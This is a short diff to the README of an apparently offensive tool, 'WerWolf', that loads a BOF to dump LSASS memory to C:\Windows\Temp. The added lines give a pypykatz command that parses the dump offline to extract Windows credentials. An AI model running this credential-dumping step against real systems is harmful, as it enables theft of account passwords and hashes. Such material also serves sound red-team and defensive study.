@@ -30,7 +30,11 @@ That's it. WerWolf automatically loads and executes the BOF. No arguments needed
 
 ## Output
 
-The dump is written to `C:\Windows\Temp\`.
+The dump is written to `C:\Windows\Temp\`. Parse it offline:
+
+```bash
+pypykatz lsa minidump C:\Windows\Temp\lsass.exe_*.dmp
+```
 
 ## Project Structure
 
